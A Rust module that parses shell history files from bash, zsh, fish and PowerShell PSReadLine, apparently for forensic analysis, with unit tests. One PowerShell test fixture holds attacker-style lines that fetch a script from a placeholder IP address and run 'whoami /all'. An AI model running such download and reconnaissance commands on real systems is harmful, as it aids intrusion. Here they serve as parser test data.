//! Shell history files: bash's `.bash_history`, zsh's `.zsh_history` (or
//! `.histfile`), fish's `fish_history`, and PowerShell's PSReadLine history
//! (`ConsoleHost_history.txt`).
//!
//! - **bash**: a command per line. With `HISTTIMEFORMAT` set, bash writes
//!   `#<seconds>` before each command, and the lines up to the next time
//!   are one command (a multi-line one). A file can start untimed and turn
//!   timed later: lines before the first time are commands of their own.
//! - **zsh**: `: <seconds>:<duration>;<command>` with `EXTENDED_HISTORY`,
//!   the bare command without; a line ending in a backslash goes on to the
//!   next. Bytes zsh wrote escaped ("metafied") are restored.
//! - **fish**: `- cmd: <command>`, `  when: <seconds>`, then the `paths:`
//!   the command named.
//! - **PowerShell** (PSReadLine, `…\PSReadLine\<host>Host_history.txt`): a
//!   command per line, untimed; a line ending in a backtick goes on to the
//!   next, as PSReadLine writes a multi-line command.
//!
//! Times are UTC. Bytes that aren't UTF-8 are replaced with U+FFFD. A line
//! that can't be read is reported in `problems`, never fatal.

use common::time::Ts;

/// This crate's version, for records of what parsed them.
pub const VERSION: &str = env!("CARGO_PKG_VERSION");

/// zsh's escape byte: the byte after it is XORed with 0x20.
const META: u8 = 0x83;

/// The shell that wrote a history file.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Format {
    /// `.bash_history`.
    Bash,
    /// `.zsh_history`, `.histfile`.
    Zsh,
    /// `fish_history`.
    Fish,
    /// PSReadLine's `<host>Host_history.txt` (`ConsoleHost_history.txt`).
    PowerShell,
}

/// One command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Command {
    /// Line number of its first line, from 1.
    pub line: usize,
    /// Byte offset of its first line.
    pub offset: u64,
    /// When it was started (UTC), when written.
    pub time: Option<Ts>,
    /// How long it ran, in seconds (zsh's extended history).
    pub duration_seconds: Option<u64>,
    /// The command, its lines joined with `\n`.
    pub command: String,
    /// The paths it named (fish).
    pub paths: Vec<String>,
}

/// A file's commands.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct History {
    /// The shell that wrote it.
    pub format: Format,
    /// Commands in file order (oldest first).
    pub commands: Vec<Command>,
    /// Lines that couldn't be read.
    pub problems: Vec<String>,
}

/// A line without its end.
#[derive(Debug, Clone, Copy)]
struct Line<'a> {
    number: usize,
    offset: u64,
    bytes: &'a [u8],
}

impl Command {
    fn new(line: Line, command: String) -> Self {
        Self {
            line: line.number,
            offset: line.offset,
            time: None,
            duration_seconds: None,
            command,
            paths: Vec::new(),
        }
    }
}

/// The shell that wrote `data`: from its content when that tells (fish's
/// `- cmd:`, zsh's `: <seconds>:`, bash's `#<seconds>`), else from the file
/// name (`.zsh_history`, `.histfile`, `fish_history`); bash otherwise.
#[must_use]
pub fn detect(data: &[u8], name: Option<&str>) -> Format {
    for line in lines(data) {
        if line.bytes.starts_with(b"- cmd:") {
            return Format::Fish;
        }
        if zsh_extended(line.bytes).is_some() {
            return Format::Zsh;
        }
        if bash_time(line.bytes).is_some() {
            return Format::Bash;
        }
    }
    let file = name
        .and_then(|n| n.rsplit(['/', '\\']).next())
        .unwrap_or("");
    if file.ends_with("zsh_history") || file.ends_with("histfile") {
        Format::Zsh
    } else if file.to_ascii_lowercase().ends_with("host_history.txt") {
        Format::PowerShell
    } else if file.ends_with("fish_history") {
        Format::Fish
    } else {
        Format::Bash
    }
}

/// Read a history file, its format detected from its content and name
/// (see [`detect`]).
#[must_use]
pub fn parse(data: &[u8], name: Option<&str>) -> History {
    parse_as(data, detect(data, name))
}

/// Read a history file written by a known shell.
#[must_use]
pub fn parse_as(data: &[u8], format: Format) -> History {
    let mut history = History {
        format,
        commands: Vec::new(),
        problems: Vec::new(),
    };
    match format {
        Format::Bash => bash(data, &mut history),
        Format::Zsh => zsh(data, &mut history),
        Format::Fish => fish(data, &mut history),
        Format::PowerShell => powershell(data, &mut history),
    }
    history
}

/// The lines of `data`, without `\n` or `\r\n`.
fn lines(data: &[u8]) -> impl Iterator<Item = Line<'_>> {
    let body = data.strip_suffix(b"\n").unwrap_or(data);
    let mut offset = 0u64;
    body.split(|&b| b == b'\n')
        .enumerate()
        .map(move |(index, raw)| {
            let line = Line {
                number: index + 1,
                offset,
                bytes: raw.strip_suffix(b"\r").unwrap_or(raw),
            };
            offset += raw.len() as u64 + 1;
            line
        })
}

fn text(bytes: &[u8]) -> String {
    String::from_utf8_lossy(bytes).into_owned()
}

/// ASCII digits as a number; `None` when empty, not digits, or too big.
fn number<T: std::str::FromStr>(digits: &[u8]) -> Option<T> {
    if digits.is_empty() || !digits.iter().all(u8::is_ascii_digit) {
        return None;
    }
    std::str::from_utf8(digits).ok()?.parse().ok()
}

/// `#<seconds>`: what follows the `#`. bash takes any `#` and digit to
/// start a time.
fn bash_time(bytes: &[u8]) -> Option<&[u8]> {
    let rest = bytes.strip_prefix(b"#")?;
    rest.first().is_some_and(u8::is_ascii_digit).then_some(rest)
}

/// Read PSReadLine's history: a command per non-blank line, a trailing
/// backtick joining the next line to it (the backtick removed); a UTF-8
/// byte order mark skipped.
fn powershell(data: &[u8], history: &mut History) {
    let data = data.strip_prefix(b"\xef\xbb\xbf").unwrap_or(data);
    let mut joined = false;
    for line in lines(data) {
        let (bytes, continues) = match line.bytes.strip_suffix(b"`") {
            Some(head) => (head, true),
            None => (line.bytes, false),
        };
        match history.commands.last_mut() {
            Some(last) if joined => {
                last.command.push('\n');
                last.command.push_str(&text(bytes));
            }
            _ if bytes.is_empty() => {}
            _ => history.commands.push(Command::new(line, text(bytes))),
        }
        joined = continues;
    }
}

/// Read bash's history as bash does with `HISTTIMEFORMAT` set: after a
/// time, every line up to the next is part of the command (blank lines
/// right after the time skipped); before the first, each non-blank line is
/// a command.
fn bash(data: &[u8], history: &mut History) {
    let mut pending: Option<(Line, Option<Ts>)> = None;
    let mut multiline = false;
    for line in lines(data) {
        if let Some(digits) = bash_time(line.bytes) {
            let time = number(digits).map(Ts::from_unix_seconds);
            if time.is_none() {
                history
                    .problems
                    .push(format!("line {}: not a time", line.number));
            }
            if let Some((orphan, _)) = pending.replace((line, time)) {
                history
                    .problems
                    .push(format!("line {}: a time without a command", orphan.number));
            }
            continue;
        }
        if line.bytes.is_empty() && (pending.is_some() || !multiline) {
            continue;
        }
        if let Some((_, time)) = pending.take() {
            let mut command = Command::new(line, text(line.bytes));
            command.time = time;
            history.commands.push(command);
            multiline = true;
            continue;
        }
        match history.commands.last_mut() {
            Some(last) if multiline => {
                last.command.push('\n');
                last.command.push_str(&String::from_utf8_lossy(line.bytes));
            }
            _ => history.commands.push(Command::new(line, text(line.bytes))),
        }
    }
    if let Some((orphan, _)) = pending {
        history
            .problems
            .push(format!("line {}: a time without a command", orphan.number));
    }
}

/// `: <seconds>:<duration>;<command>`: the start, the duration, the command.
fn zsh_extended(bytes: &[u8]) -> Option<(i64, u64, &[u8])> {
    let rest = bytes.strip_prefix(b": ")?;
    let colon = rest.iter().position(|&b| b == b':')?;
    let semicolon = rest.iter().position(|&b| b == b';')?;
    let start = number(&rest[..colon])?;
    let duration = number(rest.get(colon + 1..semicolon)?)?;
    Some((start, duration, &rest[semicolon + 1..]))
}

/// Read zsh's history as zsh does: a line ending in a backslash goes on to
/// the next (the backslash standing for the line end); a backslash and
/// spaces at the end lose one space (zsh adds it so the backslash stays);
/// a line starting with `\:` is a command starting with `:`.
fn zsh(data: &[u8], history: &mut History) {
    let mut lines = lines(data);
    while let Some(first) = lines.next() {
        let mut bytes = first.bytes.to_vec();
        while bytes.ends_with(b"\\") {
            let Some(next) = lines.next() else { break };
            bytes.pop();
            bytes.push(b'\n');
            bytes.extend_from_slice(next.bytes);
        }
        let spaces = bytes.iter().rev().take_while(|&&b| b == b' ').count();
        if spaces > 0 && bytes[..bytes.len() - spaces].ends_with(b"\\") {
            bytes.pop();
        }
        if bytes.is_empty() {
            continue;
        }
        let (timing, body) = if let Some((start, duration, body)) = zsh_extended(&bytes) {
            (Some((Ts::from_unix_seconds(start), duration)), body)
        } else if bytes.starts_with(b":") {
            history.problems.push(format!(
                "line {}: not an extended history line",
                first.number
            ));
            (None, &bytes[..])
        } else {
            let body = bytes.strip_prefix(b"\\").filter(|b| b.starts_with(b":"));
            (None, body.unwrap_or(&bytes))
        };
        let mut command = Command::new(first, text(&unmetafy(body)));
        command.time = timing.map(|(start, _)| start);
        command.duration_seconds = timing.map(|(_, duration)| duration);
        history.commands.push(command);
    }
}

/// Undo zsh's escaping of bytes it uses internally: `0x83`, then the byte
/// XORed with 0x20.
fn unmetafy(bytes: &[u8]) -> Vec<u8> {
    let mut plain = Vec::with_capacity(bytes.len());
    let mut iter = bytes.iter();
    while let Some(&byte) = iter.next() {
        match iter.as_slice().first() {
            Some(&escaped) if byte == META => {
                plain.push(escaped ^ 0x20);
                iter.next();
            }
            _ => plain.push(byte),
        }
    }
    plain
}

/// Read fish's history: `- cmd:` starts a command, `  when:` and `  paths:`
/// (a list of `    - <path>`) follow it.
fn fish(data: &[u8], history: &mut History) {
    let mut in_paths = false;
    for line in lines(data) {
        if line.bytes.is_empty() {
            continue;
        }
        if let Some(command) = line.bytes.strip_prefix(b"- cmd:") {
            history
                .commands
                .push(Command::new(line, fish_value(command)));
            in_paths = false;
            continue;
        }
        let Some(last) = history.commands.last_mut() else {
            history
                .problems
                .push(format!("line {}: not a fish history line", line.number));
            continue;
        };
        if let Some(when) = line.bytes.strip_prefix(b"  when:") {
            match number(when.trim_ascii()) {
                Some(seconds) => last.time = Some(Ts::from_unix_seconds(seconds)),
                None => history
                    .problems
                    .push(format!("line {}: not a time", line.number)),
            }
        } else if line.bytes.trim_ascii_end() == b"  paths:" {
            in_paths = true;
        } else if let Some(path) = line.bytes.strip_prefix(b"    - ").filter(|_| in_paths) {
            last.paths.push(fish_value(path));
        } else {
            history
                .problems
                .push(format!("line {}: not a fish history line", line.number));
        }
    }
}

/// A fish value: leading spaces dropped, `\\` and `\n` unescaped (fish
/// writes no other escapes; any other backslash is kept).
fn fish_value(bytes: &[u8]) -> String {
    let value = text(bytes.trim_ascii_start());
    let mut plain = String::with_capacity(value.len());
    let mut chars = value.chars();
    while let Some(c) = chars.next() {
        match (c, chars.as_str().chars().next()) {
            ('\\', Some('\\')) => plain.push('\\'),
            ('\\', Some('n')) => plain.push('\n'),
            _ => {
                plain.push(c);
                continue;
            }
        }
        chars.next();
    }
    plain
}

#[cfg(test)]
mod tests {
    use super::*;

    fn commands(history: &History) -> Vec<&str> {
        history
            .commands
            .iter()
            .map(|c| c.command.as_str())
            .collect()
    }

    #[test]
    fn detects_from_content_then_name() {
        assert_eq!(detect(b"- cmd: ls\n  when: 1\n", None), Format::Fish);
        assert_eq!(detect(b": 1457771210:0;ls\n", None), Format::Zsh);
        assert_eq!(detect(b"ls\n#1380630977\nls\n", None), Format::Bash);
        assert_eq!(detect(b"ls\n", Some("/home/u/.zsh_history")), Format::Zsh);
        assert_eq!(detect(b"ls\n", Some(r"C:\case\.histfile")), Format::Zsh);
        assert_eq!(detect(b"ls\n", Some("fish_history")), Format::Fish);
        assert_eq!(detect(b"ls\n", Some(".bash_history")), Format::Bash);
        assert_eq!(detect(b"", None), Format::Bash);
    }

    #[test]
    fn bash_blank_lines_and_orphan_times() {
        let history = parse_as(
            b"ls\n\n#5\n\necho \"a\n\nb\"\n#6\n#7\npwd\n#x\n#8",
            Format::Bash,
        );
        assert_eq!(commands(&history), ["ls", "echo \"a\n\nb\"", "pwd\n#x"]);
        assert_eq!(history.commands[1].line, 5);
        assert_eq!(history.commands[1].offset, 8);
        assert_eq!(
            history.problems,
            [
                "line 8: a time without a command",
                "line 12: a time without a command"
            ]
        );
    }

    #[test]
    fn bash_time_too_big() {
        let history = parse_as(b"#99999999999999999999\nls\n", Format::Bash);
        assert_eq!(history.commands[0].time, None);
        assert_eq!(history.problems, ["line 1: not a time"]);
    }

    #[test]
    fn zsh_continuations_and_escapes() {
        let history = parse_as(
            b": 1:2;echo a \\\\\nb\nls\\\n\\:x\nends \\\\ \n: oops\n\x83",
            Format::Zsh,
        );
        assert_eq!(
            commands(&history),
            [
                "echo a \\\nb",
                "ls\n\\:x",
                "ends \\\\",
                ": oops",
                "\u{fffd}"
            ]
        );
        assert_eq!(history.commands[0].duration_seconds, Some(2));
        assert_eq!(history.problems, ["line 6: not an extended history line"]);
        assert_eq!(commands(&parse_as(b"\\:x\n", Format::Zsh)), [":x"]);
    }

    #[test]
    fn zsh_metafied_bytes() {
        // U+2135 is E2 84 B5; zsh writes 0x84 as 0x83 0xA4.
        assert_eq!(unmetafy(b"\xe2\x83\xa4\xb5"), "\u{2135}".as_bytes());
    }

    #[test]
    fn fish_escapes_and_stray_lines() {
        let history = parse_as(
            b"  when: 1\n- cmd: echo a\\\\nb\\nc \\t\n  when: x\n  paths:\n    - /tmp/a\\nb\n  other: 1\n",
            Format::Fish,
        );
        assert_eq!(commands(&history), ["echo a\\nb\nc \\t"]);
        assert_eq!(history.commands[0].paths, ["/tmp/a\nb"]);
        assert_eq!(history.commands[0].time, None);
        assert_eq!(
            history.problems,
            [
                "line 1: not a fish history line",
                "line 3: not a time",
                "line 6: not a fish history line"
            ]
        );
    }
}

#[cfg(test)]
mod powershell_tests {
    use super::*;

    #[test]
    fn commands_and_backtick_continuations() {
        let data = b"\xef\xbb\xbfGet-Process\r\n\r\nInvoke-WebRequest `\r\n  -Uri http://192.0.2.4/a.ps1\r\nwhoami /all\n";
        let history = parse(
            data,
            Some(
                r"C:\Users\alice\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
            ),
        );
        assert_eq!(history.format, Format::PowerShell);
        let commands: Vec<&str> = history
            .commands
            .iter()
            .map(|c| c.command.as_str())
            .collect();
        assert_eq!(
            commands,
            [
                "Get-Process",
                "Invoke-WebRequest \n  -Uri http://192.0.2.4/a.ps1",
                "whoami /all"
            ]
        );
        assert_eq!(history.commands[1].line, 3);
        assert!(history.commands.iter().all(|c| c.time.is_none()));
        // Only PSReadLine's names: another `*_history.txt` isn't PowerShell.
        assert_eq!(detect(b"ls\n", Some("bash_history.txt")), Format::Bash);
    }
}
